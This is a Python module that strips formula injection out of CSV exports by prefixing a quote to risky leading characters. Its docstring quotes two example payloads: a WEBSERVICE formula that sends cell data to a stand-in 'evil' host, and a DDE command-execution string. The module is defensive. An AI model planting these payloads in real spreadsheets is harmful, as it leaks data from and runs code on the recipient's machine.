"""CSV formula-injection sanitization.

When a CSV exported by this service is opened in Excel, LibreOffice, or
Google Sheets, any cell whose first character is ``=``, ``+``, ``-``,
``@``, ``\\t``, or ``\\r`` is interpreted as a formula and executed on
the viewer's machine. An attacker who can influence any free-text KDE
(e.g. ``product_description``, ``location_name``) can plant
``=WEBSERVICE("http://evil/?x="&A1)`` to exfiltrate neighboring cells or
``=cmd|' /C calc'!A0`` to achieve RCE on older Excel versions. The
attack executes at the *recipient's* workstation — FDA auditor,
operator dashboard, recall reviewer — the exact audience this product
exists to serve.

This module provides :func:`safe_cell`, the single entry point both the
ingestion and compliance exports must call before writing a value into
a CSV row. Every code path downstream of it also enables
``csv.QUOTE_ALL`` so that values containing newlines, quotes, or commas
can't slip past a reader's quoting heuristics.

Related issues: #1081 (ingestion), #1272 (compliance), EPIC-L (#1655).
"""
from __future__ import annotations

from typing import Iterable, Mapping

# Characters that trigger formula interpretation in Excel / LibreOffice /
# Google Sheets. ``\t`` and ``\r`` bypass some quoting heuristics and are
# treated equivalently.
DANGEROUS_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value: object) -> str:
    """Neutralize a value so a spreadsheet won't treat it as a formula.

    Converts ``value`` to a string and prepends a literal single quote
    when the string starts with a dangerous prefix. Excel renders the
    leading ``'`` as invisible text — the auditor sees the value they
    expect, without the formula side effect.

    ``None`` returns ``""``. Non-string scalars are ``str()``-coerced.
    Round-trip preserved for safe values: ``"Romaine Hearts"`` returns
    unchanged.
    """
    if value is None:
        return ""
    s = str(value)
    if s and s[0] in DANGEROUS_PREFIXES:
        return "'" + s
    return s


def safe_row(row: Mapping[str, object]) -> dict[str, str]:
    """Apply :func:`safe_cell` to every value in a dict-style row."""
    return {k: safe_cell(v) for k, v in row.items()}


def safe_sequence(seq: Iterable[object]) -> list[str]:
    """Apply :func:`safe_cell` to every value in a list-style row."""
    return [safe_cell(v) for v in seq]


__all__ = ["DANGEROUS_PREFIXES", "safe_cell", "safe_row", "safe_sequence"]
